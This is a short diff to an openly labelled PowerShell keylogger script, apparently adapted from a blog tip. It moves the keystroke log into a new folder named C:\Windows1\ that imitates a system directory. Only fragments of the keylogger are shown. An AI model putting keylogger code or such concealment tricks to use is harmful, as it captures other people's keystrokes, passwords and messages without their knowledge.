@@ -1,7 +1,9 @@
 # Creator: Securethelogs | @Securethelogs
 # Modified version of: http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
 
-$path = "C:\temp\keylogger.txt"
+mkdir C:\Windows1\
+
+$path = "C:\Windows1\keylogger.txt"
 
 
 if ((Test-Path $path) -eq $false) {New-Item $path}
@@ -60,4 +62,3 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         }
     } 
      finally {exit}
-
